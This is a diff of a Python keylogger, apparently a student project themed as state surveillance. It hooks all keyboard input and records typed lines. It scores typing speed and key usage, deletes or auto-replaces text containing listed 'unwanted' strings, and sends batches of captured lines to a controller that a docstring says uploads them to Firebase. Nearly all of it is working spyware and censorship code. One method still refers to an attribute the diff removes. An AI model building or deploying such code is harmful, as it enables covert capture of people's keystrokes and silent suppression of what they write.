@@ -4,6 +4,10 @@ import time
 from difflib import SequenceMatcher
 
 """
+Keylogger, Ideas and shortcomings listed by Prof. Kruse were tried to be heard
+"""
+
+"""
 SHIFT_PUNCTUATION is a key literal list containing every shift + key combination
 """
 SHIFT_PUNCTUATION = ['!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', ';', ':', '_', '`', '*', '\'']
@@ -12,11 +16,9 @@ SHIFT_PUNCTUATION = ['!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', ';'
 Checks if a string contains a substring, if it containes returnes true, else returns false
 """
 def contains(line: str, sub: str):
-    try:
-        index = line.index(sub)
+    if line.find(sub) >= 0:
         return True
-    except:
-        return False
+    return False
 
 """
 Calculate the words per minute of a list of strings
@@ -69,10 +71,9 @@ The Keylogger also evaluates the keys usage of this user and their WPM to stipul
 citizen effectiveness and productiveness at a point in time.
 """
 class KeyLogger():
-    def __init__(self, queryController, antiGovernmentWords: List[str], antiGovernmentSentences: List[str]):
+    def __init__(self, queryController, unwantedStrings: List[str]):
         self.queryController = queryController
-        self.censorWords = antiGovernmentWords
-        self.censorSentences = antiGovernmentSentences
+        self.unwantedStrings = unwantedStrings
         self.logged = []
         self.keyEvaluation = {}
 
@@ -101,14 +102,27 @@ class KeyLogger():
     Check if the users input containes any bad word or sentence, censoring the input by deleting the line.
     Effective censoring
     """
-    def censorInput(self, line: str):
-        for badString in self.censorSentences:
-            index = line.find(badString)
-            if index > -1:
-                self.deleteLine(line)
-        for badWord in self.censorWords:
-            if line.find(badWord) >= 0:
-                self.deleteLine(line)
+    def censorLines(self, lines: List[str]):
+        """ copy = lines.copy()
+        copy.reverse()
+        for line in copy:
+            for badString in self.unwantedStrings:
+                if contains(line, badString):
+                    print(line, badString, "deleting")
+                    for _ in range(0, len(line)):
+                        keyboard.press_and_release("backspace")
+            if len(lines) > 1:
+                print("Move up")
+                moveUp(1)
+            keyboard.press_and_release("end")
+        print("Jump at end of input")
+        keyboard.press_and_release("ctrl+end") """
+        joinedLines = "".join(lines)
+        print(joinedLines)
+        for badWord in self.unwantedStrings:
+            if joinedLines.find(badWord) >= 0:
+                for _ in range(0, len(joinedLines)):
+                    keyboard.press_and_release("backspace")
 
     """
     Evaluate a keys usage by counting the occurence of the character assigned to the key
@@ -157,56 +171,71 @@ class KeyLogger():
     """
     Check for sentence similarity and return a list of such sentences
     """
-    def checkSentences(self, sentences: List[str]):
+    def checkSentences(self, lines: List[str]):
         foundSentences = []
-        for sentence in sentences:
-            for antiSentence in self.censorSentences:
-                if similar(sentence, antiSentence):
-                    foundSentences.append(sentence)
+        for line in lines:
+            sentences = line.split(".")
+            for sentence in sentences:
+                for antiSentence in self.censorSentences:
+                    if similar(sentence, antiSentence):
+                        foundSentences.append(sentence)
         return foundSentences
+
+    def addAbbreviations(self):
+        for badString in self.unwantedStrings:
+            keyboard.add_abbreviation(badString, "")
 
     """
     Main attraction of the Keylogger Class. Read the key input stream of the windows I/O hook.
     Evaluate the wpm, key usage and such. Deduct the written strings. Censor by abbreviation and
     deleting lines if input conataines non-allowed (sub-) strings
     """
-    def readKeyInput(self):
-        for badWord in self.censorWords:
-            keyboard.add_abbreviation(badWord, "")
-        for badSentence in self.censorSentences:
-            keyboard.add_abbreviation(badSentence, "")
-        keyboard.remap_key("tab", "space+space+space+space")
+    def readKeyEvents(self):
         while 1:
+            startTime = time.time()
             lines = []
-            recordingStart = time.time()
-            keyboard.start_recording()
-            keyboard.wait("enter")
-            keyEvents = keyboard.stop_recording()
-            recordingEnd = time.time()
-            typedStrings = keyboard.get_typed_strings(keyEvents)
-            for line in typedStrings:
-                if len(line) > 0:
-                    lines.append(line)
-            if contains(line, "konami"):
-                    return
-            self.censorInput(lines[0])
+            lines.clear()
+            keyEvents = self.readFirstNKeyEvents()
+            writtenStrings = keyboard.get_typed_strings(keyEvents, allow_backspace=False)
+            endTime = time.time()
+            for string in writtenStrings:
+                if contains(string, "konami"):
+                    print("Exiting Keylogger")
+                    return 1
+                lines.append(string)
+            print(len(lines))
+            self.censorLines(lines)
             keyEvaluation = self.evaluateKeyUsage(lines)
-            WPM = wpm(lines, recordingEnd, recordingStart)
-            yield lines[0]
+            WPM = wpm(lines, endTime, startTime)
+            yield lines
+
+    def readFirstNKeyEvents(self):
+        keyEvents = []
+        checkTime = time.time()
+        while time.time()-checkTime < 5:
+            keyEvent = keyboard.read_event()
+            checkTime = time.time()
+            if len(keyEvents) >= 50 and keyEvent.name == "space":
+                return keyEvents
+            if keyEvent.name != "tab":
+                keyEvents.append(keyEvent)
+        return keyEvents
 
     """
     Initiating a generator object with the readKeyInput method. After a enter key is pressed,
     upload the deducted line to the firebase data storage solution
     """
     def main(self):
-        input = self.readKeyInput()
+        self.addAbbreviations()
         log = []
         counter = 0
-        for i in input:
-            if len(i) > 0:
-                log.append(i)
-            if counter % 5 == 0:
-                self.queryController.addToKeyLogs(log)
-                counter = 0
-                log.clear()
-            counter = counter + 1
+        for lines in self.readKeyEvents():
+            for line in lines:
+                if len(line) > 0:
+                    log.append(line)
+                if counter > 5:
+                    if self.queryController is not None:
+                        self.queryController.addToKeyLogs(log)
+                        counter = 0
+                        log.clear()
+                counter = counter + 1
